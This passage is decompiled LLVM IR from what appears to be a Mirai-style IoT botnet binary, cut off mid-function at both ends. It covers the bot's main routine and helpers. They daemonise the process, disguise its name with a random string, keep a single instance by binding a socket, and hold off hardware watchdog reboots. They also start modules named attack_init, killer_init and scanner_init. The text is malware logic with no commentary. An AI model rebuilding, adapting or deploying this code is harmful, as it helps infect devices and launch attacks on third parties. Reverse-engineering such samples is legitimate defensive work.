  store i32 4, i32* @r5, align 4
  %v5_e7ec = call i32 @__GI_setsockopt(i32 %v3_e7c4, i32 %v0_e7dc, i32 2, i32 %v2_e7d8, i32 4)
  %v2_e7f0 = load i32, i32* @global_var_244cc.120, align 4
  store i32 %v2_e7f0, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_e800 = call i32 @__libc_fcntl(i32 %v2_e7f0, i32 3)
  %v0_e804 = load i32, i32* @r5, align 4
  %v1_e808 = or i32 %v2_e800, 2048
  store i32 %v1_e808, i32* @r2, align 4
  %v0_e80c = load i32, i32* @r4, align 4
  %v2_e810 = call i32 @__libc_fcntl(i32 %v0_e80c, i32 %v0_e804)
  store i32 ptrtoint (i8** @global_var_244d8.122 to i32), i32* @r8, align 4
  %v2_e818 = load i8, i8* bitcast (i8** @global_var_244d8.122 to i8*), align 4
  %v2_e81c = icmp eq i8 %v2_e818, 0
  br i1 %v2_e81c, label %.thread2, label %bb

.thread2:                                         ; preds = %dec_label_pc_e7d8
  br label %bb20

bb:                                               ; preds = %dec_label_pc_e7d8
  br label %bb20

bb20:                                             ; preds = %.thread2, %bb
  %v0_e840 = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_e848 = inttoptr i32 %v0_e840 to i32*
  store i32 0, i32* %v2_e848, align 4
  %v2_e84c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_e84c, i32* @r5, align 4
  store i32 %v0_e840, i32* @r4, align 4
  %v2_e85c = load i32, i32* @global_var_244cc.120, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_e868 = call i32 @bind(i32 %v2_e85c, i32 %v2_e84c, i32 16)
  %v7_e86c = icmp eq i32 %v3_e868, -1
  br i1 %v7_e86c, label %dec_label_pc_e890, label %dec_label_pc_e874

dec_label_pc_e874:                                ; preds = %bb20
  %v2_e87c = load i32, i32* @global_var_244cc.120, align 4
  %v2_e880 = call i32 @listen(i32 %v2_e87c, i32 1)
  br label %dec_label_pc_e884

dec_label_pc_e884:                                ; preds = %entry, %dec_label_pc_e89c, %dec_label_pc_e874
  %v1_e88c = phi i32 [ %v3_e7c4, %entry ], [ %v1_e8e4, %dec_label_pc_e89c ], [ %v2_e880, %dec_label_pc_e874 ]
  store i32 %v9_e7a8, i32* @r6, align 4
  store i32 %v12_e7a8, i32* @r7, align 4
  store i32 %v15_e7a8, i32* @r8, align 4
  ret i32 %v1_e88c

dec_label_pc_e890:                                ; preds = %bb20
  %v0_e890 = load i32, i32* @r4, align 4
  %v1_e890 = inttoptr i32 %v0_e890 to i32*
  %v2_e890 = load i32, i32* %v1_e890, align 4
  %v7_e894 = icmp eq i32 %v2_e890, 99
  br i1 %v7_e894, label %dec_label_pc_e8ec, label %dec_label_pc_e89c

dec_label_pc_e89c:                                ; preds = %dec_label_pc_e8ec, %bb21, %dec_label_pc_e890
  %v2_e8b4 = load i32, i32* @global_var_244cc.120, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_e8c4 = call i32 @__libc_connect(i32 %v2_e8b4, i32 %v2_e84c, i32 16)
  %v1_e8cc = call i32 @sleep(i32 5)
  %v2_e8d0 = load i32, i32* @global_var_244cc.120, align 4
  %v1_e8d4 = call i32 @__GI___libc_close(i32 %v2_e8d0)
  %v1_e8e0 = call i32 @killer_kill_by_port(i32 50951)
  %v1_e8e4 = call i32 @ensure_single_instance(i32 %v1_e8e0)
  br label %dec_label_pc_e884

dec_label_pc_e8ec:                                ; preds = %dec_label_pc_e890
  %v2_e8ec = load i8, i8* bitcast (i8** @global_var_244d8.122 to i8*), align 4
  %v3_e8ec = zext i8 %v2_e8ec to i32
  %v1_e8f0 = load i32, i32* @r7, align 4
  %v9_e8f0 = icmp eq i32 %v3_e8ec, %v1_e8f0
  br i1 %v9_e8f0, label %dec_label_pc_e89c, label %bb21

bb21:                                             ; preds = %dec_label_pc_e8ec
  %v2_e8f8 = trunc i32 %v1_e8f0 to i8
  store i8 %v2_e8f8, i8* bitcast (i8** @global_var_244d8.122 to i8*), align 4
  br label %dec_label_pc_e89c

; uselistorder directives
  uselistorder i32 %v2_e84c, { 1, 0, 2 }
  uselistorder i32 %v3_e7c4, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 0, 2, 1 }
  uselistorder i8* bitcast (i8** @global_var_244d8.122 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_244d8.122, { 1, 0 }
  uselistorder label %dec_label_pc_e89c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e884, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_e90c = load i32, i32* @r4, align 4
  %v6_e90c = load i32, i32* @r5, align 4
  %v0_e914 = call i32 @__libc_fork()
  %v7_e918 = icmp eq i32 %v0_e914, -1
  %. = zext i1 %v7_e918 to i32
  %tmp11 = icmp slt i32 %v0_e914, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_e934 = icmp eq i32 %storemerge4, 0
  store i32 %v0_e914, i32* @global_var_24650.125, align 4
  br i1 %v2_e934, label %dec_label_pc_e94c, label %dec_label_pc_e940

dec_label_pc_e940:                                ; preds = %entry
  store i32 %v3_e90c, i32* @r4, align 4
  store i32 %v6_e90c, i32* @r5, align 4
  ret i32 %v0_e914

dec_label_pc_e94c:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_e958 = call i32 @table_unlock_val(i32 55)
  %v1_e960 = call i32 @table_unlock_val(i32 56)
  %v0_e964 = load i32, i32* @r5, align 4
  %v2_e96c = inttoptr i32 %v0_e964 to i32*
  %v3_e96c = call i32 @table_retrieve_val(i32 55, i32* %v2_e96c)
  %v3_e974 = call i32 @__libc_open(i32 %v3_e96c, i16* inttoptr (i32 2 to i16*))
  %v7_e978 = icmp eq i32 %v3_e974, -1
  store i32 %v3_e974, i32* @r4, align 4
  br i1 %v7_e978, label %dec_label_pc_e9c0, label %dec_label_pc_e984

dec_label_pc_e984:                                ; preds = %dec_label_pc_e9c0, %dec_label_pc_e94c
  %v0_e990 = phi i32 [ %v3_e9d0, %dec_label_pc_e9c0 ], [ %v3_e974, %dec_label_pc_e94c ]
  %v2_e994 = ptrtoint i32* %stack_var_-20 to i32
  %v3_e998 = call i32 @ioctl(i32 %v0_e990, i32 -2147199228, i32 %v2_e994)
  br label %dec_label_pc_e99c

dec_label_pc_e99c:                                ; preds = %dec_label_pc_e99c, %dec_label_pc_e984
  %v0_e9a8 = load i32, i32* @r4, align 4
  %v3_e9b0 = call i32 @ioctl(i32 %v0_e9a8, i32 -2147199227, i32 0)
  %v1_e9b8 = call i32 @sleep(i32 10)
  br label %dec_label_pc_e99c

dec_label_pc_e9c0:                                ; preds = %dec_label_pc_e94c
  %v0_e9c0 = load i32, i32* @r5, align 4
  %v2_e9c8 = inttoptr i32 %v0_e9c0 to i32*
  %v3_e9c8 = call i32 @table_retrieve_val(i32 56, i32* %v2_e9c8)
  %v3_e9d0 = call i32 @__libc_open(i32 %v3_e9c8, i16* inttoptr (i32 2 to i16*))
  %v3_e9d4 = icmp eq i32 %v3_e9d0, -1
  store i32 %v3_e9d0, i32* @r4, align 4
  br i1 %v3_e9d4, label %dec_label_pc_e9e0, label %dec_label_pc_e984

dec_label_pc_e9e0:                                ; preds = %dec_label_pc_e9c0
  %v1_e9e4 = call i32 @table_lock_val(i32 55)
  %v1_e9ec = call i32 @table_lock_val(i32 56)
  %v0_e9f0 = load i32, i32* @r5, align 4
  %v1_e9f4 = call i32 @__GI_exit(i32 %v0_e9f0)
  %v0_e9f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e9f8, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_e9e0
  %v3_e9f8 = load i32, i32* @r6, align 4
  %v8_e9f8 = ashr i32 %v1_e9f4, %v3_e9f8
  %v9_e9f8 = and i32 %v8_e9f8, %arg1
  store i32 %v9_e9f8, i32* @r4, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_e9e0, %bb14
  ret i32 %v1_e9f4

; uselistorder directives
  uselistorder i32 %v3_e9d0, { 1, 2, 0 }
  uselistorder i32 %v3_e974, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_e914, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_ea0c = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_ea0c, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_ea24 = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  %v2_ea30 = call i32 @__GI_sigaddset(i32 %v2_ea0c, i32 2)
  %v0_ea34 = load i32, i32* @r5, align 4
  store i32 %v0_ea34, i32* %r2.global-to-local, align 4
  %v4_ea40 = call i32 @__GI_sigprocmask(i32 %v0_ea34, i32* nonnull %stack_var_-64, i32 %v0_ea34)
  %v2_ea4c = call i32 @bsd_signal(i32 17, i32 1)
  %v2_ea58 = call i32 @bsd_signal(i32 5, i32 59212)
  %v0_ea5c = call i32 @util_local_addr()
  store i16 -23551, i16* bitcast (i32* @global_var_2716e.118 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_27164.91 to i32), i32* %r3.global-to-local, align 4
  store i32 -583215265, i32* %r2.global-to-local, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 %v0_ea5c, i32* @global_var_27164.91, align 4
  store i32 -583215265, i32* @global_var_27170.117, align 4
  store i16 2, i16* bitcast (i16** @global_var_2716c.115 to i16*), align 4
  %v5_ea90 = call i32 @table_init(i32 %v0_ea5c, i32 ptrtoint (i16** @global_var_2716c.115 to i32), i32 -583215265, i32 ptrtoint (i32* @global_var_27164.91 to i32))
  store i32 ptrtoint (i32* @global_var_e764.111 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_244d4.113 to i32), i32* @lr, align 4
  %v2_ea9c = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_ea9c, i32* @sb, align 4
  store i32 ptrtoint (i32* @global_var_e764.111 to i32), i32* @global_var_244d4.113, align 4
  %v1_eaa4 = call i32 @ensure_single_instance(i32 %v5_ea90)
  %v1_eaa8 = call i32 @rand_init(i32 %v1_eaa4)
  %v2_eab4 = call i32 @util_zero(i32 %v2_ea9c, i32 32)
  %v0_eab8 = load i32, i32* @r6, align 4
  %v7_eab8 = icmp eq i32 %v0_eab8, 2
  br i1 %v7_eab8, label %dec_label_pc_ebe8, label %dec_label_pc_eac0

dec_label_pc_eac0:                                ; preds = %dec_label_pc_ebe8, %entry, %dec_label_pc_ebf8
  %v0_eac0 = call i32 @rand_next()
  store i32 %v0_eac0, i32* @r6, align 4
  %v0_eac8 = load i32, i32* @r8, align 4
  %v1_eac8 = inttoptr i32 %v0_eac8 to i32*
  %v2_eac8 = load i32, i32* %v1_eac8, align 4
  %v1_eacc = inttoptr i32 %v2_eac8 to i8*
  %v2_eacc = call i32 @util_strlen(i8* %v1_eacc)
  %v0_ead4 = load i32, i32* @r8, align 4
  %v1_ead4 = inttoptr i32 %v0_ead4 to i32*
  %v2_ead4 = load i32, i32* %v1_ead4, align 4
  %v1_ead8 = inttoptr i32 %v2_ead4 to i8*
  %v2_ead8 = call i32 @util_strlen(i8* %v1_ead8)
  %v1_eadc = sub i32 20, %v2_eacc
  %v0_eae4 = load i32, i32* @r6, align 4
  %v3_eae8 = urem i32 %v0_eae4, %v1_eadc
  %v2_eaec = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_eaec, i32* @r5, align 4
  %v2_eaf0 = add i32 %v3_eae8, %v2_ead8
  store i32 %v2_eaf0, i32* @r4, align 4
  %v2_eafc = call i32 @rand_alphastr(i32 %v2_eaec, i32 %v2_eaf0)
  %v2_eb00 = ptrtoint i32* %stack_var_-40 to i32
  %v1_eb04 = load i32, i32* @r4, align 4
  %v2_eb04 = add i32 %v1_eb04, %v2_eb00
  store i32 %v2_eb04, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_eb10 = load i32, i32* @r8, align 4
  %v1_eb10 = inttoptr i32 %v0_eb10 to i32*
  %v2_eb10 = load i32, i32* %v1_eb10, align 4
  store i32 %v2_eb10, i32* @r0, align 4
  %v3_eb14 = add i32 %v2_eb04, -80
  %v4_eb14 = inttoptr i32 %v3_eb14 to i8*
  store i8 0, i8* %v4_eb14, align 1
  %v2_eb18 = inttoptr i32 %v2_eb10 to i8*
  %v3_eb18 = call i32 @util_strcpy(i8* %v2_eb18, i32 %v2_eaec)
  %v2_eb24 = call i32 @util_zero(i32 %v2_eaec, i32 32)
  %v0_eb28 = call i32 @rand_next()
  store i32 %v0_eb28, i32* @r7, align 4
  %v0_eb30 = load i32, i32* @r8, align 4
  %v1_eb30 = inttoptr i32 %v0_eb30 to i32*
  %v2_eb30 = load i32, i32* %v1_eb30, align 4
  %v1_eb34 = inttoptr i32 %v2_eb30 to i8*
  %v2_eb34 = call i32 @util_strlen(i8* %v1_eb34)
  store i32 %v2_eb34, i32* @r6, align 4
  %v0_eb3c = load i32, i32* @r8, align 4
  %v1_eb3c = inttoptr i32 %v0_eb3c to i32*
  %v2_eb3c = load i32, i32* %v1_eb3c, align 4
  %v1_eb40 = inttoptr i32 %v2_eb3c to i8*
  %v2_eb40 = call i32 @util_strlen(i8* %v1_eb40)
  %v0_eb44 = load i32, i32* @r6, align 4
  %v1_eb44 = sub i32 20, %v0_eb44
  %v0_eb4c = load i32, i32* @r7, align 4
  %v3_eb50 = urem i32 %v0_eb4c, %v1_eb44
  %v2_eb54 = add i32 %v3_eb50, %v2_eb40
  store i32 %v2_eb54, i32* @r4, align 4
  %v2_eb60 = call i32 @rand_alphastr(i32 %v2_eaec, i32 %v2_eb54)
  store i32 %v2_eb00, i32* %r2.global-to-local, align 4
  %v1_eb68 = load i32, i32* @r4, align 4
  %v2_eb68 = add i32 %v1_eb68, %v2_eb00
  store i32 %v2_eb68, i32* %r3.global-to-local, align 4
  %v0_eb6c = load i32, i32* @sl, align 4
  %v1_eb6c = trunc i32 %v0_eb6c to i8
  %v3_eb6c = add i32 %v2_eb68, -80
  %v4_eb6c = inttoptr i32 %v3_eb6c to i8*
  store i8 %v1_eb6c, i8* %v4_eb6c, align 1
  %v4_eb78 = call i32 @prctl(i32 15, i32 %v2_eaec, i32 %v2_eb00, i32 %v2_eb68)
  %v1_eb80 = call i32 @table_unlock_val(i32 3)
  %v3_eb90 = call i32 @table_retrieve_val(i32 3, i32* nonnull %stack_var_-48)
  %v3_eb94 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_eb94, i32* @r2, align 4
  %v2_eba0 = call i32 @__GI___libc_write(i32 1, i32 %v3_eb90)
  store i32 1, i32* @r2, align 4
  %v2_ebb0 = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_1b3a8.132 to i32))
  %v1_ebb8 = call i32 @table_lock_val(i32 3)
  %v1_ebbc = call i32 @attack_init(i32 %v1_ebb8)
  %v1_ebc0 = call i32 @killer_init(i32 %v1_ebbc)
  %v1_ebc4 = call i32 @watchdog_maintain(i32 %v1_ebc0)
  %v0_ebc8 = call i32 @__libc_fork()
  %v1_ebcc = load i32, i32* @sl, align 4
  %v7_ebd0 = icmp sgt i32 %v0_ebc8, %v1_ebcc
  br i1 %v7_ebd0, label %dec_label_pc_ebd4, label %dec_label_pc_ec20

dec_label_pc_ebd4:                                ; preds = %dec_label_pc_eac0
  ret i32 %v1_ebcc

dec_label_pc_ebe8:                                ; preds = %entry
  %v0_ebe8 = load i32, i32* @r8, align 4
  %v1_ebe8 = add i32 %v0_ebe8, 4
  %v2_ebe8 = inttoptr i32 %v1_ebe8 to i32*
  %v3_ebe8 = load i32, i32* %v2_ebe8, align 4
  %v1_ebec = inttoptr i32 %v3_ebe8 to i8*
  %v2_ebec = call i32 @util_strlen(i8* %v1_ebec)
  %v8_ebf4 = icmp sgt i32 %v2_ebec, 31
  br i1 %v8_ebf4, label %dec_label_pc_eac0, label %dec_label_pc_ebf8

dec_label_pc_ebf8:                                ; preds = %dec_label_pc_ebe8
  %v0_ebf8 = load i32, i32* @r8, align 4
  %v1_ebf8 = add i32 %v0_ebf8, 4
  %v2_ebf8 = inttoptr i32 %v1_ebf8 to i32*
  %v3_ebf8 = load i32, i32* %v2_ebf8, align 4
  store i32 %v2_ea9c, i32* @r0, align 4
  %v2_ec00 = bitcast i32* %stack_var_-152 to i8*
  %v3_ec00 = call i32 @util_strcpy(i8* %v2_ec00, i32 %v3_ebf8)
  %v0_ec04 = load i32, i32* @r8, align 4
  %v1_ec04 = add i32 %v0_ec04, 4
  %v2_ec04 = inttoptr i32 %v1_ec04 to i32*
  %v3_ec04 = load i32, i32* %v2_ec04, align 4
  %v1_ec0c = inttoptr i32 %v3_ec04 to i8*
  %v2_ec0c = call i32 @util_strlen(i8* %v1_ec0c)
  %v2_ec18 = call i32 @util_zero(i32 %v3_ec04, i32 %v2_ec0c)
  br label %dec_label_pc_eac0

dec_label_pc_ec20:                                ; preds = %dec_label_pc_eac0
  %v1_ec20 = call i32 @__GI_setsid(i32 %v0_ebc8)
  %v0_ec28 = load i32, i32* @sl, align 4
  %v1_ec2c = call i32 @__GI___libc_close(i32 %v0_ec28)
  %v1_ec34 = call i32 @__GI___libc_close(i32 1)
  %v1_ec3c = call i32 @__GI___libc_close(i32 2)
  store i32 ptrtoint (i32* @global_var_244d0.134 to i32), i32* @fp, align 4
  %v1_ec44 = call i32 @attack_init(i32 %v1_ec3c)
  %v1_ec48 = call i32 @killer_init(i32 %v1_ec44)
  %v1_ec4c = call i32 @watchdog_maintain(i32 %v1_ec48)
  %v1_ec50 = call i32 @scanner_init(i32 %v1_ec4c)
  %v0_ec54 = load i32, i32* @sl, align 4
  %v2_ec58 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_ec58, i32* @r6, align 4
  %v2_ec5c = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_ec5c, i32* @r7, align 4
  %v2_ed3c = ptrtoint i32* %stack_var_-72 to i32
  %v2_ed8c = ptrtoint i32* %stack_var_-168 to i32
  %v2_ef68 = ptrtoint i32* %stack_var_-56 to i32
  %v2_ef70 = ptrtoint i8** %stack_var_-42 to i32
  %v2_f118 = ptrtoint i32* %stack_var_-1432 to i32
  %v2_ef8c = ptrtoint i32* %stack_var_-52 to i32
  %v1_f040 = bitcast i32* %stack_var_-152 to i8*
  %v2_f000 = ptrtoint i32* %stack_var_-88 to i32
  %v1_f01c = sub i32 0, %v1_ec20
  br label %dec_label_pc_ec60

dec_label_pc_ec60:                                ; preds = %dec_label_pc_f0a0, %dec_label_pc_f13c, %bb44, %dec_label_pc_f03c, %dec_label_pc_ee70, %dec_label_pc_ee60, %bb41, %dec_label_pc_f190, %dec_label_pc_f0fc, %dec_label_pc_f0b0, %dec_label_pc_f08c, %dec_label_pc_efb8, %dec_label_pc_eee0, %dec_label_pc_ee18, %dec_label_pc_ec20
  %stack_var_-1436.0 = phi i32 [ %v0_ec54, %dec_label_pc_ec20 ], [ %stack_var_-1436.0, %bb41 ], [ %stack_var_-1436.1, %dec_label_pc_ee60 ], [ %stack_var_-1436.1, %dec_label_pc_ee70 ], [ %stack_var_-1436.1, %bb44 ], [ %stack_var_-1436.1, %dec_label_pc_f0b0 ], [ %stack_var_-1436.1, %dec_label_pc_eee0 ], [ %stack_var_-1436.1, %dec_label_pc_f13c ], [ %stack_var_-1436.1, %dec_label_pc_f190 ], [ %stack_var_-1436.1, %dec_label_pc_f0fc ], [ %stack_var_-1436.1, %dec_label_pc_ee18 ], [ %stack_var_-1436.1, %dec_label_pc_f03c ], [ %stack_var_-1436.1, %dec_label_pc_f08c ], [ %stack_var_-1436.1, %dec_label_pc_efb8 ], [ %stack_var_-1436.1, %dec_label_pc_f0a0 ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ec6c

dec_label_pc_ec6c:                                ; preds = %dec_label_pc_ec6c, %dec_label_pc_ec60
  %v1_ec70 = phi i32 [ %v1_ec74, %dec_label_pc_ec6c ], [ 4, %dec_label_pc_ec60 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ec70 = load i32, i32* @r6, align 4
  %v3_ec70 = add i32 %v2_ec70, %v1_ec70
  %v4_ec70 = inttoptr i32 %v3_ec70 to i32*
  store i32 0, i32* %v4_ec70, align 4
  %v0_ec74 = load i32, i32* %r3.global-to-local, align 4
  %v1_ec74 = add i32 %v0_ec74, 4
  store i32 %v1_ec74, i32* %r3.global-to-local, align 4
  %v7_ec78 = icmp eq i32 %v1_ec74, 128
  br i1 %v7_ec78, label %dec_label_pc_ec80, label %dec_label_pc_ec6c

dec_label_pc_ec80:                                ; preds = %dec_label_pc_ec6c
  %v0_ec80 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ec80, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ec88

dec_label_pc_ec88:                                ; preds = %dec_label_pc_ec88, %dec_label_pc_ec80
  %v1_ec8c = phi i32 [ %v1_ec90, %dec_label_pc_ec88 ], [ 4, %dec_label_pc_ec80 ]
  store i32 0, i32* @r4, align 4
  %v2_ec8c = load i32, i32* @r7, align 4
  %v3_ec8c = add i32 %v2_ec8c, %v1_ec8c
  %v4_ec8c = inttoptr i32 %v3_ec8c to i32*
  store i32 0, i32* %v4_ec8c, align 4
  %v0_ec90 = load i32, i32* %r3.global-to-local, align 4
  %v1_ec90 = add i32 %v0_ec90, 4
  store i32 %v1_ec90, i32* %r3.global-to-local, align 4
  %v7_ec94 = icmp eq i32 %v1_ec90, 128
  br i1 %v7_ec94, label %dec_label_pc_ec9c, label %dec_label_pc_ec88

dec_label_pc_ec9c:                                ; preds = %dec_label_pc_ec88
  store i32 ptrtoint (i32* @global_var_244cc.120 to i32), i32* %r3.global-to-local, align 4
  %v2_eca0 = load i32, i32* @global_var_244cc.120, align 4
  %v7_eca4 = icmp eq i32 %v2_eca0, -1
  br i1 %v7_eca4, label %dec_label_pc_ecd0, label %dec_label_pc_ecac

dec_label_pc_ecac:                                ; preds = %dec_label_pc_ec9c
  %v3_ecac = udiv i32 %v2_eca0, 32
  %v3_ecb0 = mul nuw nsw i32 %v3_ecac, 4
  store i32 %v2_eb00, i32* %ip.global-to-local, align 4
  %v2_ecb8 = add i32 %v3_ecb0, %v2_eb00
  store i32 %v2_ecb8, i32* %r3.global-to-local, align 4
  %v1_ecbc = add i32 %v2_ecb8, -240
  %v2_ecbc = inttoptr i32 %v1_ecbc to i32*
  %v3_ecbc = load i32, i32* %v2_ecbc, align 4
  %v1_ecc0 = urem i32 %v2_eca0, 32
  %v7_ecc8 = shl i32 1, %v1_ecc0
  %v8_ecc8 = or i32 %v3_ecbc, %v7_ecc8
  store i32 %v8_ecc8, i32* %r2.global-to-local, align 4
  store i32 %v8_ecc8, i32* %v2_ecbc, align 4
  br label %dec_label_pc_ecd0

dec_label_pc_ecd0:                                ; preds = %dec_label_pc_ec9c, %dec_label_pc_ecac
  %v2_ecd0 = load i32, i32* @global_var_244d0.134, align 4
  store i32 %v2_ecd0, i32* @r3, align 4
  %v7_ecd4 = icmp eq i32 %v2_ecd0, -1
  store i32 ptrtoint (i32* @global_var_244d0.134 to i32), i32* @r8, align 4
  br i1 %v7_ecd4, label %dec_label_pc_eef8, label %dec_label_pc_ece0

dec_label_pc_ece0:                                ; preds = %dec_label_pc_eef8, %dec_label_pc_ecd0, %bb43
  %v2_ece4 = load i8, i8* bitcast (i8** @global_var_24654.137 to i8*), align 4
  %v2_ece8 = icmp eq i8 %v2_ece4, 0
  %v2_ee34 = load i32, i32* @global_var_244d0.134, align 4
  store i32 %v2_ee34, i32* %ip.global-to-local, align 4
  %v3_ee38 = udiv i32 %v2_ee34, 32
  store i32 %v3_ee38, i32* %r3.global-to-local, align 4
  br i1 %v2_ece8, label %dec_label_pc_ee34, label %dec_label_pc_ecf0

dec_label_pc_ecf0:                                ; preds = %dec_label_pc_ece0
  %v3_ecfc = mul nuw nsw i32 %v3_ee38, 4
  %v2_ed00 = add i32 %v3_ecfc, %v2_eb00
  store i32 %v2_ed00, i32* %r3.global-to-local, align 4
  %v1_ed04 = add i32 %v2_ed00, -368
  %v2_ed04 = inttoptr i32 %v1_ed04 to i32*
  %v3_ed04 = load i32, i32* %v2_ed04, align 4
  %v1_ed08 = urem i32 %v2_ee34, 32
  %v7_ed10 = shl i32 1, %v1_ed08
  %v8_ed10 = or i32 %v3_ed04, %v7_ed10
  store i32 %v8_ed10, i32* %r2.global-to-local, align 4
  store i32 %v8_ed10, i32* %v2_ed04, align 4
  br label %dec_label_pc_ed18

dec_label_pc_ed18:                                ; preds = %dec_label_pc_ee34, %dec_label_pc_ecf0
  store i32 ptrtoint (i32* @global_var_244cc.120 to i32), i32* %r3.global-to-local, align 4
  %v2_ed1c = load i32, i32* @global_var_244cc.120, align 4
  store i32 0, i32* @lr, align 4
  %v0_ed24 = load i32, i32* %ip.global-to-local, align 4
  %v5_ed28 = icmp slt i32 %v0_ed24, %v2_ed1c
  br i1 %v5_ed28, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_ed18
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_ed18, %bb
  %v0_ed38 = phi i32 [ %v2_ed1c, %dec_label_pc_ed18 ], [ %v0_ed24, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_ed38 = add i32 %v0_ed38, 1
  store i32 %v2_ed3c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_ec5c, i32* %r2.global-to-local, align 4
  %v5_ed54 = call i32 @__libc_select(i32 %v1_ed38, i32 %v2_ec58, i32 %v2_ec5c, i32 0, i32 %v2_ed3c)
  %v8_ed58 = icmp eq i32 %v5_ed54, -1
  br i1 %v8_ed58, label %dec_label_pc_ec60, label %dec_label_pc_ed60

dec_label_pc_ed60:                                ; preds = %bb41
  %v6_ed54 = trunc i32 %v5_ed54 to i16
  %v3_ed60 = icmp eq i16 %v6_ed54, 0
  br i1 %v3_ed60, label %dec_label_pc_ed68, label %dec_label_pc_ed9c

dec_label_pc_ed68:                                ; preds = %dec_label_pc_ed60
  %v5_ed74 = srem i32 %stack_var_-1436.0, 6
  %v4_ed7c = sub i32 %stack_var_-1436.0, %v5_ed74
  store i32 %v4_ed7c, i32* %r3.global-to-local, align 4
  %v2_ed84 = icmp eq i32 %v5_ed74, 0
  %v1_ed88 = add i32 %stack_var_-1436.0, 1
  store i32 %v1_ed88, i32* @lr, align 4
  store i32 %v2_ed8c, i32* %r2.global-to-local, align 4
  %v7_ed90 = inttoptr i32 %v5_ed54 to i8*
  store i8* %v7_ed90, i8** %stack_var_-42, align 4
  br i1 %v2_ed84, label %dec_label_pc_ef68, label %dec_label_pc_ed9c

dec_label_pc_ed9c:                                ; preds = %dec_label_pc_ed60, %dec_label_pc_ed68, %dec_label_pc_ef68
  %stack_var_-1436.1 = phi i32 [ %v1_ed88, %dec_label_pc_ef68 ], [ %v1_ed88, %dec_label_pc_ed68 ], [ %stack_var_-1436.0, %dec_label_pc_ed60 ]
  store i32 ptrtoint (i32* @global_var_244cc.120 to i32), i32* %r3.global-to-local, align 4
  %v2_eda0 = load i32, i32* @global_var_244cc.120, align 4
  %v7_eda4 = icmp eq i32 %v2_eda0, -1
  br i1 %v7_eda4, label %dec_label_pc_edd0, label %dec_label_pc_edac

dec_label_pc_edac:                                ; preds = %dec_label_pc_ed9c
  %v3_edac = udiv i32 %v2_eda0, 32
  %v3_edb0 = mul nuw nsw i32 %v3_edac, 4
  store i32 %v2_eb00, i32* %ip.global-to-local, align 4
  %v2_edb8 = add i32 %v3_edb0, %v2_eb00
  store i32 %v2_edb8, i32* %r3.global-to-local, align 4
  %v1_edbc = add i32 %v2_edb8, -240
  %v2_edbc = inttoptr i32 %v1_edbc to i32*
  %v3_edbc = load i32, i32* %v2_edbc, align 4
  %v1_edc0 = urem i32 %v2_eda0, 32
  %v6_edc4 = ashr i32 %v3_edbc, %v1_edc0
  store i32 %v6_edc4, i32* %r2.global-to-local, align 4
  %v1_edc8 = urem i32 %v6_edc4, 2
  %v2_edc8 = icmp eq i32 %v1_edc8, 0
  br i1 %v2_edc8, label %dec_label_pc_edd0, label %dec_label_pc_eff4

dec_label_pc_edd0:                                ; preds = %dec_label_pc_edac, %dec_label_pc_ed9c
